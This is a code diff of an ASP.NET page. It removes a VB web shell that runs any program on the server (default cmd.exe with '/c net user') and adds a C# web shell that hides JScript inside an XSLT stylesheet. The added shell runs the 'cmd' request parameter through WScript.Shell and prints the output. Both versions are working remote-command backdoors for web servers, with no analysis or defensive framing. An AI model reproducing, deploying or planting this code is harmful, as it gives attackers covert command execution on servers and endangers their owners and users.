@@ -1,37 +1,44 @@
-<%@ Page Language="VB" Debug="true" %>
-<%@ import Namespace="system.IO" %>
-<%@ import Namespace="System.Diagnostics" %>
-
-<script runat="server">      
-
-Sub RunCmd(Src As Object, E As EventArgs)            
-  Dim myProcess As New Process()            
-  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
-  myProcessStartInfo.UseShellExecute = false            
-  myProcessStartInfo.RedirectStandardOutput = true            
-  myProcess.StartInfo = myProcessStartInfo            
-  myProcessStartInfo.Arguments=xcmd.text            
-  myProcess.Start()            
-
-  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
-  Dim myString As String = myStreamReader.Readtoend()            
-  myProcess.Close()            
-  mystring=replace(mystring,"<","&lt;")            
-  mystring=replace(mystring,">","&gt;")            
-  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
-End Sub
-
-</script>
-
-<html>
-<body>    
-<form runat="server">        
-<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
-<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
-<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
-<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
-<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
-<p><asp:Label id="result" runat="server"></asp:Label>       
-</form>
-</body>
-</html>
+<%@page language="C#"%>
+<%@ import Namespace="System.IO"%>
+<%@ import Namespace="System.Xml"%>
+<%@ import Namespace="System.Xml.Xsl"%>
+<%
+string xml=@"<?xml version=""1.0""?><root>test</root>";
+string xslt=@"<?xml version='1.0'?>
+<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:zcg=""zcgonvh"">
+	<msxsl:script language=""JScript"" implements-prefix=""zcg"">
+	<msxsl:assembly name=""mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>
+	<msxsl:assembly name=""System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""/>
+	<msxsl:assembly name=""System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>
+	<msxsl:assembly name=""System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/>
+		<![CDATA[function xml(){
+		var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;
+		var command = Request.Item['cmd'];
+		var r = new ActiveXObject(""WScript.Shell"").Exec(""cmd /c ""+command);
+		var OutStream = r.StdOut;
+		var Str = """";
+		while (!OutStream.atEndOfStream) {
+    		Str = Str + OutStream.readAll();
+			}
+		Response.Write(""<pre>""+Str+""</pre>"");
+		}]]>
+	</msxsl:script>
+<xsl:template match=""/root"">
+	<xsl:value-of select=""zcg:xml()""/>
+</xsl:template>
+</xsl:stylesheet>";
+XmlDocument xmldoc=new XmlDocument();
+xmldoc.LoadXml(xml);
+XmlDocument xsldoc=new XmlDocument();
+xsldoc.LoadXml(xslt);
+XsltSettings xslt_settings = new XsltSettings(false, true);
+xslt_settings.EnableScript = true;
+try{
+	XslCompiledTransform xct=new XslCompiledTransform();
+	xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());
+	xct.Transform(xmldoc,null,new MemoryStream());
+}
+catch (Exception e){
+    Response.Write("Error");
+}
+%>
